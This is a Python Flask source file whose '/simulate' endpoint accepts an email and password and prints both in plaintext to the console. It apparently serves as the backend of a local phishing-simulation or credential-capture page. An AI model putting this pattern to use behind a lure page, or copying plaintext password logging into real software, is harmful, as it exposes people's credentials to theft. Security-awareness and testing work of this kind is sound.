from datetime import datetime
import os
import sys

def create_app():
    """Builds the Flask application with open terminal logging for verification."""
    from flask import Flask, render_template, request, jsonify

    app = Flask(__name__)

    @app.get("/")
    def home():
        return render_template("index.html")

    @app.post("/simulate")
    def simulate():
        # Check for JSON data first, fall back to standard HTML form data
        if request.is_json:
            data = request.get_json(silent=True) or {}
            email = str(data.get("email", "")).strip()
            password = str(data.get("password", ""))
        else:
            email = str(request.form.get("email", "")).strip()
            password = str(request.form.get("password", ""))

        # Validation checks
        if not email:
            return jsonify(ok=False, message="Email field is missing or empty."), 400
        if not password:
            return jsonify(ok=False, message="Password field is missing or empty."), 400

        # Print the transmission logs directly to your server window
        timestamp = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
        print(f"\n[{timestamp}] --- INCOMING DATA LOGGED ---")
        print(f"Received Email:    {email}")
        print(f"Received Password: {password}")
        print("-" * 40)

        return jsonify(
            ok=True,
            message="Data received successfully."
        )
        
    return app


def start_server():
    """Entry point for your global terminal shortcut command."""
    base_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(base_dir)

    # Forcefully inject your hidden virtual environment paths BEFORE loading Flask
    venv_site_packages = os.path.join(base_dir, ".venv", "lib", "python3.14", "site-packages")
    if os.path.exists(venv_site_packages):
        sys.path.insert(0, venv_site_packages)
    
    app_instance = create_app()
    print("Launching Flask Web Server...")
    app_instance.run(host="127.0.0.1", port=5000, debug=False)

if __name__ == "__main__":
    start_server()

